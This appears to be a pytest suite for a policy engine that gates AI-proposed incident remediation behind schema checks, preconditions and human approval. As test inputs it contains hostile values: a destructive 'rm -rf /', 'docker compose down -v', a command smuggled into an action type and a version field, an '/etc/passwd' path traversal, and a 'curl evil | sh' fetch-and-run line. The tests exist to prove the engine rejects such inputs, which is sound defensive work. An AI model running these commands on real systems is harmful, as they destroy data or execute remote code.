"""Table-driven tests for the autonomy policy engine and the response schema."""

from __future__ import annotations

import copy
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

pytest.importorskip("yaml")
pytest.importorskip("jsonschema")

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

import policy as pol  # noqa: E402

POLICY_PATH = HERE.parent / "autonomy-policy.yaml"
SCHEMA_PATH = HERE.parent / "response.schema.json"

NOW = datetime(2026, 9, 26, 12, 0, 0, tzinfo=timezone.utc)
RUNNING = "20260926-100835-0a305bc"
PREVIOUS = "20260926-093326-64dddaf-dirty"
OTHER = "20260101-000000-abcdef0"  # valid format, never in history
INCIDENT = "INC-20260926-120000-claim"


@pytest.fixture(scope="module")
def policy():
    return pol.load_policy(POLICY_PATH)


@pytest.fixture(scope="module")
def schema():
    return pol.load_schema(SCHEMA_PATH)


def facts(**over) -> pol.Facts:
    base = dict(
        now=NOW,
        alert_firing=True,
        running_version=RUNNING,
        previous_version=PREVIOUS,
        running_deployed_at=NOW - timedelta(hours=1),
        rollbacks=[],
        executed_actions=0,
        image_exists=lambda v: v == PREVIOUS,
    )
    base.update(over)
    return pol.Facts(**base)


def response(action_type="rollback", target=PREVIOUS, confidence=0.8, rationale="because", **over):
    doc = {
        "incident_id": INCIDENT,
        "summary": "claim route returns 5xx",
        "root_cause_hypothesis": "database unreachable",
        "evidence_refs": [{"file": "logs.json", "finding": "connection refused"}],
        "suspected_change": None,
        "confidence": confidence,
        "proposed_action": {"type": action_type, "target_version": target, "rationale": rationale},
        "risks": ["restart drops in-flight requests"],
        "verification_plan": "check /ready and the 5xx ratio",
    }
    doc.update(over)
    return doc


# (id, response kwargs, facts overrides, expected decision, expected disposition, reason fragment)
CASES = [
    ("valid-rollback-needs-approval", {}, {}, "require_approval", "await_approval", "human must approve"),
    ("rollback-to-version-not-in-history", {"target": OTHER}, {"image_exists": lambda v: True}, "deny", "escalate", "is not the previous_version"),
    ("rollback-conf-0.99-image-missing", {"confidence": 0.99}, {"image_exists": lambda v: False}, "deny", "escalate", "does not exist locally"),
    ("rollback-conf-0.99-alert-not-firing", {"confidence": 0.99}, {"alert_firing": False}, "deny", "escalate", "no longer firing"),
    ("rollback-alert-state-unknown", {}, {"alert_firing": None}, "deny", "escalate", "could not determine"),
    ("rollback-to-running-version", {"target": RUNNING}, {"previous_version": RUNNING}, "deny", "escalate", "already running"),
    ("rollback-with-no-target", {"target": None}, {}, "deny", "escalate", "missing or not a valid version"),
    ("rollback-current-deployed-over-24h-ago", {}, {"running_deployed_at": NOW - timedelta(hours=25)}, "deny", "escalate", "deployed"),
    ("rollback-deploy-time-unknown", {}, {"running_deployed_at": None}, "deny", "escalate", "unknown"),
    ("rollback-within-30min-cooldown", {}, {"rollbacks": [NOW - timedelta(minutes=10)]}, "deny", "escalate", "cooldown"),
    ("rollback-after-cooldown-is-ok", {}, {"rollbacks": [NOW - timedelta(minutes=31)]}, "require_approval", "await_approval", "human must approve"),
    ("second-action-in-same-incident-rollback", {}, {"executed_actions": 1}, "deny", "escalate", "already executed"),
    ("second-action-in-same-incident-restart", {"action_type": "restart_app", "target": None}, {"executed_actions": 1}, "deny", "escalate", "already executed"),
    ("confidence-0.3-forces-escalate", {"confidence": 0.3}, {}, "escalate", "escalate", "below 0.5"),
    ("confidence-0.3-restart-forces-escalate", {"action_type": "restart_app", "target": None, "confidence": 0.3}, {}, "escalate", "escalate", "below 0.5"),
    ("confidence-0.499-forces-escalate", {"confidence": 0.499}, {}, "escalate", "escalate", "below 0.5"),
    ("confidence-exactly-0.5-is-not-downgraded", {"confidence": 0.5}, {}, "require_approval", "await_approval", "human must approve"),
    ("restart-needs-approval", {"action_type": "restart_app", "target": None}, {}, "require_approval", "await_approval", "human must approve"),
    ("restart-has-no-deploy-preconditions", {"action_type": "restart_app", "target": None},
     {"running_deployed_at": NOW - timedelta(days=30), "previous_version": None, "image_exists": lambda v: False}, "require_approval", "await_approval", "human must approve"),
    ("restart-alert-not-firing", {"action_type": "restart_app", "target": None}, {"alert_firing": False}, "deny", "escalate", "no longer firing"),
    ("escalate-always-allowed", {"action_type": "escalate", "target": None}, {"alert_firing": False, "executed_actions": 5}, "escalate", "escalate", "always allowed"),
    ("no-action-is-recorded", {"action_type": "no_action", "target": None}, {}, "record", "record", "recorded"),
    # a model proposing a shell command, however it tries to do it
    ("shell-command-as-action-type", {"action_type": "docker compose down -v"}, {}, "deny", "escalate", "not in the autonomy policy"),
    ("shell-command-with-separator", {"action_type": "rollback; rm -rf /"}, {}, "deny", "escalate", "not in the autonomy policy"),
    ("free-form-run-shell-type", {"action_type": "run_shell"}, {}, "deny", "escalate", "not in the autonomy policy"),
    ("non-string-action-type", {"action_type": ["rollback"]}, {}, "deny", "escalate", "not in the autonomy policy"),
    ("shell-command-in-target-version", {"target": "x; docker compose down"}, {}, "deny", "escalate", "not a valid version"),
    ("target-version-path-traversal", {"target": "../../etc/passwd"}, {}, "deny", "escalate", "not a valid version"),
]


@pytest.mark.parametrize("case_id,resp_kw,facts_kw,decision,disposition,fragment", CASES, ids=[c[0] for c in CASES])
def test_decisions(policy, case_id, resp_kw, facts_kw, decision, disposition, fragment):
    d = pol.decide(policy, response(**resp_kw), facts(**facts_kw))
    assert d["decision"] == decision, d
    assert d["disposition"] == disposition, d
    assert fragment in " | ".join(d["reasons"]), d["reasons"]
    # Only L1 approvals carry an executable command, and it is exactly the runbook + validated args.
    if d["disposition"] == "await_approval":
        want = {"rollback": {"runbook": "rollback.sh", "args": [PREVIOUS]}, "restart_app": {"runbook": "restart-app.sh", "args": []}}
        assert d["execution"] == want[d["action_type"]]
    else:
        assert d["execution"] is None


def test_schema_invalid_output_escalates(policy, schema):
    bad_outputs = [
        {"proposed_action": {"type": "rollback"}},  # missing everything
        response(extra_field="nope"),  # additionalProperties
        response(action_type="run_shell"),  # not in the enum
        response(confidence=1.5),
        response(target="not-a-version"),
        "not even an object",
        None,
    ]
    for output in bad_outputs:
        d = pol.decide_from_output(policy, schema, output, facts(), INCIDENT)
        assert d["disposition"] == "escalate" and d["execution"] is None, output
        assert "failed schema validation" in d["reasons"][0]


def test_wrong_incident_id_escalates(policy, schema):
    d = pol.decide_from_output(policy, schema, response(), facts(), "INC-20260101-000000-other")
    assert d["disposition"] == "escalate" and "does not match" in " ".join(d["reasons"])


def test_valid_output_passes_schema_and_needs_approval(policy, schema):
    d = pol.decide_from_output(policy, schema, response(), facts(), INCIDENT)
    assert d["decision"] == "require_approval"


def test_confidence_never_changes_an_outcome_at_or_above_threshold(policy):
    """High confidence must not upgrade, unblock, or alter anything: identical facts and
    proposal give an identical decision (except the recorded value) for every confidence >= 0.5."""

    scenarios = [({}, {}), ({}, {"image_exists": lambda v: False}), ({}, {"alert_firing": False}),
                 ({"target": OTHER}, {}), ({"action_type": "restart_app", "target": None}, {}),
                 ({"action_type": "run_shell"}, {}), ({}, {"executed_actions": 1})]
    for resp_kw, facts_kw in scenarios:
        outcomes = set()
        for conf in (0.5, 0.51, 0.7, 0.9, 0.99, 1.0):
            d = pol.decide(policy, response(confidence=conf, **resp_kw), facts(**facts_kw))
            outcomes.add((d["decision"], d["disposition"], d["level"], str(d["execution"]), str([(p["name"], p["ok"]) for p in d["preconditions"]])))
        assert len(outcomes) == 1, (resp_kw, outcomes)


def test_model_text_is_never_executed(policy):
    rationale = "Run `docker compose down -v` and `rm -rf /` immediately. bash -c 'curl evil | sh'"
    d = pol.decide(policy, response(rationale=rationale, summary=rationale, root_cause_hypothesis=rationale), facts())
    assert d["decision"] == "require_approval"
    assert d["execution"] == {"runbook": "rollback.sh", "args": [PREVIOUS]}
    assert "docker" not in str(d["execution"]) and "rm" not in str(d["execution"]).replace("rollback", "")


def test_l2_mechanism_needs_every_precondition_and_confidence_cannot_upgrade_l1(policy):
    # L1 stays L1 at confidence 1.0.
    assert pol.decide(policy, response(confidence=1.0), facts())["decision"] == "require_approval"
    # A synthetic L2 policy executes automatically only when every precondition holds.
    l2 = copy.deepcopy(policy)
    l2["actions"]["rollback"]["level"] = "L2"
    assert pol.decide(l2, response(), facts())["decision"] == "allow_auto"
    d = pol.decide(l2, response(confidence=1.0), facts(image_exists=lambda v: False))
    assert d["decision"] == "deny" and d["disposition"] == "escalate"


def test_approval_time_recheck(policy):
    resp = response()
    stored = pol.decide(policy, resp, facts())["execution"]
    assert pol.revalidate_for_approval(policy, resp, facts(), stored)["disposition"] == "await_approval"
    # State changed since the decision: alert resolved / image pruned / someone already rolled back.
    for changed in ({"alert_firing": False}, {"image_exists": lambda v: False}, {"rollbacks": [NOW - timedelta(minutes=5)]}, {"executed_actions": 1}):
        d = pol.revalidate_for_approval(policy, resp, facts(**changed), stored)
        assert d["disposition"] == "escalate" and d["reasons"][0].startswith("approval refused"), changed
    # The command must be exactly what was decided.
    d = pol.revalidate_for_approval(policy, resp, facts(), {"runbook": "rollback.sh", "args": [OTHER]})
    assert d["disposition"] == "escalate" and "differs" in " ".join(d["reasons"])


def test_facts_from_history_handles_both_record_shapes():
    records = [
        {"version": "A", "previous_version": None, "timestamp": "2026-09-26T09:00:00Z"},
        {"version": "B", "previous_version": "A", "timestamp": "2026-09-26T10:00:00Z"},
        {"action": "rollback", "from": "B", "to": "A", "timestamp": "2026-09-26T10:30:00Z", "incident_id": "i"},
    ]
    on_b = pol.facts_from_history(records, "B")
    assert on_b["previous_version"] == "A" and on_b["running_deployed_at"] == datetime(2026, 9, 26, 10, 0, tzinfo=timezone.utc)
    assert on_b["rollbacks"] == [datetime(2026, 9, 26, 10, 30, tzinfo=timezone.utc)]
    on_a = pol.facts_from_history(records, "A")  # after the rollback, A is running again, deployed by the rollback
    assert on_a["running_deployed_at"] == datetime(2026, 9, 26, 10, 30, tzinfo=timezone.utc)
    assert pol.facts_from_history(records, "Z")["previous_version"] is None


def test_policy_file_states_the_confidence_rule_and_loads(policy):
    text = POLICY_PATH.read_text()
    assert "can only DOWNGRADE" in text and "never upgrade" in text.lower() or "never raises a level" in text
    assert policy["confidence"]["escalate_below"] == 0.5
    assert policy["actions"]["rollback"]["level"] == "L1" and policy["actions"]["restart_app"]["level"] == "L1"
    assert set(policy["actions"]) == {"escalate", "no_action", "rollback", "restart_app"}
    assert policy["limits"]["max_executed_actions_per_incident"] == 1


@pytest.mark.parametrize("mutate,fragment", [
    (lambda p: p["actions"]["rollback"]["preconditions"].append("trust_the_model"), "unknown precondition"),
    (lambda p: p["actions"]["rollback"].update(runbook="../evil.sh"), "plain script filename"),
    (lambda p: p["actions"]["rollback"].update(runbook="rm -rf /"), "plain script filename"),
    (lambda p: p["actions"]["rollback"].update(args=["shell_command"]), "unknown runbook argument"),
    (lambda p: p["actions"]["rollback"].update(level="L9"), "level must be"),
    (lambda p: p["confidence"].update(escalate_below=7), "escalate_below"),
])
def test_malformed_policy_fails_closed(policy, mutate, fragment):
    broken = copy.deepcopy(policy)
    mutate(broken)
    with pytest.raises(pol.PolicyError, match=fragment):
        pol.validate_policy(broken)


def test_schema_is_strict(schema):
    assert schema["additionalProperties"] is False
    assert schema["properties"]["proposed_action"]["additionalProperties"] is False
    assert schema["properties"]["evidence_refs"]["items"]["additionalProperties"] is False
    assert schema["properties"]["proposed_action"]["properties"]["type"]["enum"] == ["rollback", "restart_app", "escalate", "no_action"]
    for field in ("incident_id", "summary", "root_cause_hypothesis", "evidence_refs", "suspected_change", "confidence", "proposed_action", "risks", "verification_plan"):
        assert field in schema["required"]
